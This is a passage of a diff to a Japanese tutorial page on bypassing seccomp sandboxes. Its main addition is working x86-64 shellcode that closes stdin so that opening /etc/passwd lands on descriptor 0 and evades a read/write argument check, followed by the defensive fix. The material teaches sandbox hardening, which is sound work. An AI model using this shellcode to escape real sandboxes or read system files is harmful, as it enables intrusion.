class="line"> 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>
+<p>このルールは<code>open</code>, <code>read</code>, <code>write</code>, <code>close</code>のみを許可するホワイトボックスルールです。任意ファイルを読み書きできないように、<code>read</code>, <code>write</code>の引数を確認し、それぞれstdin(=0), stdout(=1)への読み書きしか許可していません。</p>
+<p>安全に見えるかもしれませんが、次のようなコードで回避できます。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">xor edi, edi</span><br><span class="line">mov eax, &#123;syscall.x64.close&#125;</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">xor esi, esi</span><br><span class="line">lea rdi, [rel pathname]</span><br><span class="line">mov eax, &#123;syscall.x64.open&#125;</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov edx, 0x1000</span><br><span class="line">mov rsi, rsp</span><br><span class="line">mov edi, eax</span><br><span class="line">mov eax, &#123;syscall.x64.read&#125;</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov edx, eax</span><br><span class="line">mov rsi, rsp</span><br><span class="line">mov edi, 1</span><br><span class="line">mov eax, &#123;syscall.x64.write&#125;</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">pathname: db &quot;/etc/passwd&quot;, 0</span><br></pre></td></tr></table></figure>
+<p>このシェルコードでは、最初に<code>close</code>でstdinを閉じています。したがって、次の<code>open</code>で<code>/etc/passwd</code>を開いたときにファイルディスクリプタとして0番が選ばれ、<code>read</code>の引数チェックを回避できます。</p>
+<p>stdinとstdoutの<code>close</code>を禁止するルールを書けば安全になります。</p>
 <h2 id="サイドチャネル攻撃">サイドチャネル攻撃</h2>
 <p>メモリ上の情報漏洩が目的で、コマンド実行などが不要な場合もあります。このような場合はシステムコールを利用せずに情報漏洩が可能かもしれません。</p>
 <h3 id="エラーの観測">エラーの観測</h3>
 <h3 id="処理時間の計測">処理時間の計測</h3>
+<h2 id="アーキテクチャとシステムコール番号の検証不備">アーキテクチャとシステムコール番号の検証不備</h2>
+<p>適切にホワイトリスト・ブラックリスト方式を実装していても問題が起きるケースを紹介します。</p>
+<h3 id="アーキテクチャの検証不備">アーキテクチャの検証不備</h3>
+<h3 id="x32-ABIの利用">x32 ABIの利用</h3>
 <h2 id="その他の回避手法">その他の回避手法</h2>
-<h3 id="TRACEとseccomp">TRACEとseccomp</h3>
+<h3 id="カーネルやライブラリの欠陥の利用">カーネルやライブラリの欠陥の利用</h3>
 <h3 id="他プロセスの悪用">他プロセスの悪用</h3>
-<h4 id="creatとprocfs">creatとprocfs</h4>
 <h4 id="kill-tkill-tgkill">kill, tkill, tgkill</h4>
 <h4 id="prlimit64">prlimit64</h4>
-<h4 id="ptrace">ptrace</h4>
-<h4 id="process-vm-readv-process-vm-writev">process_vm_readv, process_vm_writev</h4>
-<h3 id="カーネルやライブラリの欠陥の利用">カーネルやライブラリの欠陥の利用</h3>
+<hr>
+<div class="column" title="例題１">
+</div>
+<p><a href="seccomp-answer.html">☞ 例題の解答</a></p>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p>Dockerで該当脆弱性があり、Shockerという名前で有名です。 <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
 
 </div> 
 
@@ -262,7 +368,7 @@ p.spoiler {
     <div class="flex-container">
         <div class="footer-text">
             
-                © 2022 ptr-yudai 🐈
+                © 2023 ptr-yudai 🐈
                 <br>
             
             
